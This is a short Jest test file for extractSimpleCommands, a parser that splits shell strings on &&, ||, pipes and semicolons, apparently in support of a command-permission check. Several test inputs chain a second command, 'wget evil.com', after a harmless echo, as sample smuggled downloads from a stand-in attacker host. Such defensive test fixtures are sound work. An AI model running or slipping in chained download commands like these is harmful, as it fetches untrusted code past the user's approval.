import { extractSimpleCommands } from '../extractSimpleCommands.js';

describe('extractSimpleCommands', () => {
  it.each([
    { input: ['echo hello'], expected: ['echo hello'] },
    { input: [''], expected: [''] },
    {
      input: ['echo hello && wget evil.com'],
      expected: ['echo hello', 'wget evil.com'],
    },
    {
      input: ['echo hello || wget evil.com'],
      expected: ['echo hello', 'wget evil.com'],
    },
    {
      input: ['echo hello | grep world'],
      expected: ['echo hello', 'grep world'],
    },
    {
      input: ['echo hello; wget evil.com'],
      expected: ['echo hello', 'wget evil.com'],
    },
  ])('$input', ({ input, expected }) => {
    const actual = extractSimpleCommands(...input);
    expect(actual).toEqual(expected);
  });
});
